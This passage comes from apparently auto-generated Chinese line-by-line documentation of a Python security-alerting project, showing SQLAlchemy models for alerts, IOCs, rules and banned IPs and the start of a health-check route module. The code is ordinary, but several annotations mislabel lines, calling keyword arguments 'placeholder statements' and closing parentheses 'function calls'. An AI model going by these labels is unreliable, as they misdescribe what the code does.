| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 40 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[str] = mapped_column(String(64), primary_key=True)` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    external_id: Mapped[Optional[str]] = mapped_column(String(255), index=True)` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    timestamp: Mapped[datetime] = mapped_column(DateTime(timezone=True), nullable=False)` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    source_ip: Mapped[str] = mapped_column(String(45), nullable=False, default="")` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    target_ip: Mapped[Optional[str]] = mapped_column(String(45))` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_type: Mapped[str] = mapped_column(String(128), nullable=False, default="unknown")` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level: Mapped[str] = mapped_column(String(32), nullable=False, default="low")` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    confidence: Mapped[Optional[float]] = mapped_column(Float)` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    engine: Mapped[Optional[str]] = mapped_column(String(128))` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status: Mapped[str] = mapped_column(String(32), nullable=False, default="open")` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    summary: Mapped[Optional[str]] = mapped_column(Text)` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw_payload: Mapped[Optional[str]] = mapped_column(Text)` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_version: Mapped[Optional[str]] = mapped_column(String(64))` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 55 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    histories: Mapped[List["AlertHistory"]] = relationship(` |
| 62 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "AlertHistory",` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        back_populates="alert",` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cascade="all, delete-orphan",` |
| 65 | 占位语句：保持语法完整但当前不执行操作。 | `        passive_deletes=True,` |
| 66 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    response_actions: Mapped[List["ResponseAction"]] = relationship(` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ResponseAction",` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        back_populates="alert",` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cascade="all, delete-orphan",` |
| 71 | 占位语句：保持语法完整但当前不执行操作。 | `        passive_deletes=True,` |
| 72 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 75 | 类定义：声明 `AlertHistory`，封装相关状态与行为。 | `class AlertHistory(db.Model):` |
| 76 | 文档字符串：说明当前模块、类或函数的职责。 | `    """告警状态流转历史。"""` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "alert_histories"` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id: Mapped[str] = mapped_column(` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `        String(64),` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ForeignKey("alerts.id", ondelete="CASCADE"),` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        nullable=False,` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        index=True,` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    from_status: Mapped[Optional[str]] = mapped_column(String(32))` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    to_status: Mapped[str] = mapped_column(String(32), nullable=False)` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    operator: Mapped[Optional[str]] = mapped_column(String(128))` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    note: Mapped[Optional[str]] = mapped_column(Text)` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 93 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 94 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert: Mapped["Alert"] = relationship("Alert", back_populates="histories")` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 类定义：声明 `ResponseAction`，封装相关状态与行为。 | `class ResponseAction(db.Model):` |
| 99 | 文档字符串：说明当前模块、类或函数的职责。 | `    """针对告警的响应动作记录（封禁、解封、演练等）。"""` |
| 100 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "response_actions"` |
| 102 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id: Mapped[Optional[str]] = mapped_column(` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `        String(64),` |
| 106 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ForeignKey("alerts.id", ondelete="CASCADE"),` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        nullable=True,` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        index=True,` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    action_type: Mapped[str] = mapped_column(String(64), nullable=False)` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    target: Mapped[Optional[str]] = mapped_column(String(512))` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status: Mapped[str] = mapped_column(String(32), nullable=False, default="pending")` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    dry_run: Mapped[bool] = mapped_column(Boolean, nullable=False, default=False)` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    meta: Mapped[Optional[Any]] = mapped_column(JSON)` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    error: Mapped[Optional[str]] = mapped_column(Text)` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    scheduled_unblock_at: Mapped[Optional[datetime]] = mapped_column(` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True)` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 121 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 124 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert: Mapped[Optional["Alert"]] = relationship("Alert", back_populates="response_actions")` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 类定义：声明 `ResponseScheduleTask`，封装相关状态与行为。 | `class ResponseScheduleTask(db.Model):` |
| 130 | 文档字符串：说明当前模块、类或函数的职责。 | `    """响应调度任务：定时解封、通知重试等（可恢复）。"""` |
| 131 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "response_schedule_tasks"` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __table_args__ = (Index("ix_response_schedule_run", "status", "run_at"),)` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    task_type: Mapped[str] = mapped_column(String(64), nullable=False, index=True)` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id: Mapped[Optional[str]] = mapped_column(` |
| 138 | 函数调用：执行已有函数/方法完成当前步骤。 | `        String(64),` |
| 139 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ForeignKey("alerts.id", ondelete="SET NULL"),` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        nullable=True,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        index=True,` |
| 142 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Mapped[Optional[Any]] = mapped_column(JSON)` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    run_at: Mapped[datetime] = mapped_column(DateTime(timezone=True), nullable=False, index=True)` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status: Mapped[str] = mapped_column(String(32), nullable=False, default="pending")` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    attempt_count: Mapped[int] = mapped_column(Integer, nullable=False, default=0)` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    max_attempts: Mapped[int] = mapped_column(Integer, nullable=False, default=5)` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    related_response_action_id: Mapped[Optional[int]] = mapped_column(Integer, index=True)` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    last_error: Mapped[Optional[str]] = mapped_column(Text)` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 151 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 155 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 158 | 类定义：声明 `Rule`，封装相关状态与行为。 | `class Rule(db.Model):` |
| 159 | 文档字符串：说明当前模块、类或函数的职责。 | `    """检测规则（与 Phase 7 规则 API 语义对齐，供后续迁移）。"""` |
| 160 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "rules"` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __table_args__ = (Index("ix_rules_enabled_priority", "enabled", "priority"),)` |
| 163 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[str] = mapped_column(String(64), primary_key=True)` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name: Mapped[str] = mapped_column(String(80), nullable=False)` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rule_type: Mapped[str] = mapped_column("type", String(32), nullable=False)` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pattern: Mapped[str] = mapped_column(Text, nullable=False)` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    action: Mapped[str] = mapped_column(String(32), nullable=False)` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level: Mapped[str] = mapped_column(String(32), nullable=False)` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    priority: Mapped[int] = mapped_column(Integer, nullable=False, default=100)` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enabled: Mapped[bool] = mapped_column(Boolean, nullable=False, default=True)` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    description: Mapped[Optional[str]] = mapped_column(String(400))` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    hits: Mapped[int] = mapped_column(Integer, nullable=False, default=0)` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 178 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 180 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 181 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 182 | 类定义：声明 `IOC`，封装相关状态与行为。 | `class IOC(db.Model):` |
| 183 | 文档字符串：说明当前模块、类或函数的职责。 | `    """威胁情报 IOC 条目（生产化：TTL、多源合并、过期窗口）。"""` |
| 184 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "iocs"` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __table_args__ = (` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `        UniqueConstraint("ioc_type", "value", name="uq_iocs_type_value"),` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `        Index("ix_iocs_value", "value"),` |
| 189 | 函数调用：执行已有函数/方法完成当前步骤。 | `        Index("ix_iocs_expires_at", "expires_at"),` |
| 190 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 191 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[str] = mapped_column(String(64), primary_key=True)` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ioc_type: Mapped[str] = mapped_column("ioc_type", String(32), nullable=False)` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value: Mapped[str] = mapped_column(String(512), nullable=False)` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sources: Mapped[Optional[Any]] = mapped_column(JSON)` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason: Mapped[Optional[str]] = mapped_column(String(200))` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    note: Mapped[Optional[str]] = mapped_column(String(400))` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    score: Mapped[Optional[int]] = mapped_column(Integer)` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ttl_seconds: Mapped[Optional[int]] = mapped_column(Integer)` |
| 200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    first_seen: Mapped[Optional[datetime]] = mapped_column(DateTime(timezone=True))` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    last_seen: Mapped[Optional[datetime]] = mapped_column(DateTime(timezone=True))` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    expires_at: Mapped[Optional[datetime]] = mapped_column(DateTime(timezone=True))` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ioc_meta: Mapped[Optional[Any]] = mapped_column("ioc_meta", JSON)` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    hits: Mapped[int] = mapped_column(Integer, nullable=False, default=0)` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    added_at: Mapped[datetime] = mapped_column(` |
| 206 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 207 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 209 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 210 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 211 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 212 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 213 | 类定义：声明 `Setting`，封装相关状态与行为。 | `class Setting(db.Model):` |
| 214 | 文档字符串：说明当前模块、类或函数的职责。 | `    """键值型系统设置（JSON 值）。"""` |
| 215 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "settings"` |
| 217 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    key: Mapped[str] = mapped_column(String(128), primary_key=True)` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value: Mapped[Optional[Any]] = mapped_column(JSON)` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 221 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 222 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 223 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 224 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 225 | 类定义：声明 `BannedIp`，封装相关状态与行为。 | `class BannedIp(db.Model):` |
| 226 | 文档字符串：说明当前模块、类或函数的职责。 | `    """手工/API 封禁的 IP 列表（持久化）。"""` |
| 227 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "banned_ips"` |
| 229 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 230 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ip: Mapped[str] = mapped_column(String(45), primary_key=True)` |
| 231 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason: Mapped[str] = mapped_column(String(200), nullable=False, default="manual")` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    operator: Mapped[Optional[str]] = mapped_column(String(128))` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 234 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated_at: Mapped[datetime] = mapped_column(` |
| 237 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now, onupdate=_utc_now` |
| 238 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 239 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 240 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 241 | 类定义：声明 `AuditEvent`，封装相关状态与行为。 | `class AuditEvent(db.Model):` |
| 242 | 文档字符串：说明当前模块、类或函数的职责。 | `    """安全审计事件。"""` |
| 243 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "audit_events"` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __table_args__ = (Index("ix_audit_created", "created_at"),)` |
| 246 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    event_type: Mapped[str] = mapped_column(String(64), nullable=False, index=True)` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    actor: Mapped[Optional[str]] = mapped_column(String(128))` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resource_type: Mapped[Optional[str]] = mapped_column(String(64))` |
| 251 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resource_id: Mapped[Optional[str]] = mapped_column(String(255))` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Mapped[Optional[Any]] = mapped_column(JSON)` |
| 253 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ip_address: Mapped[Optional[str]] = mapped_column(String(45))` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 255 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 256 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 257 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 259 | 类定义：声明 `ModelVersion`，封装相关状态与行为。 | `class ModelVersion(db.Model):` |
| 260 | 文档字符串：说明当前模块、类或函数的职责。 | `    """已登记/部署的模型版本元数据。"""` |
| 261 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __tablename__ = "model_versions"` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    __table_args__ = (UniqueConstraint("version", name="uq_model_versions_version"),)` |
| 264 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)` |
| 266 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    version: Mapped[str] = mapped_column(String(64), nullable=False)` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    artifact_uri: Mapped[Optional[str]] = mapped_column(String(512))` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    checksum: Mapped[Optional[str]] = mapped_column(String(128))` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    deployed_at: Mapped[Optional[datetime]] = mapped_column(DateTime(timezone=True))` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    notes: Mapped[Optional[str]] = mapped_column(Text)` |
| 271 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Mapped[datetime] = mapped_column(` |
| 272 | 函数调用：执行已有函数/方法完成当前步骤。 | `        DateTime(timezone=True), nullable=False, default=_utc_now` |
| 273 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |

## `web/observability_routes.py`

- 类型：路由与 API
- 行数：206

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Kubernetes 风格健康检查与 Prometheus 文本指标（不含密钥）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 6 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Tuple` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from flask import Flask, Response, jsonify` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy import text` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from src.observability.guardian_metrics import read_guardian_redis_snapshot` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from src.utils.redis_client import RedisClient` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from web.audit_integrity_patrol import get_last_audit_integrity_valid` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from web.database import db` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 函数定义：声明 `_redis_for_app` 的输入、处理逻辑和返回结果。 | `def _redis_for_app(app: Flask) -> RedisClient:` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cfg = app.extensions.get("guardian_os_config")` |
| 20 | 条件判断：满足条件时进入对应分支。 | `    if cfg is None:` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `        from config.config import get_config` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = get_config()` |
| 24 | 返回结果：把处理后的值交回调用方。 | `    return RedisClient(` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        host=getattr(cfg, "REDIS_HOST", "localhost"),` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        port=int(getattr(cfg, "REDIS_PORT", 6379)),` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        db=int(getattr(cfg, "REDIS_DB", 0)),` |
| 28 | 占位语句：保持语法完整但当前不执行操作。 | `        password=str(getattr(cfg, "REDIS_PASSWORD", "") or ""),` |
| 29 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
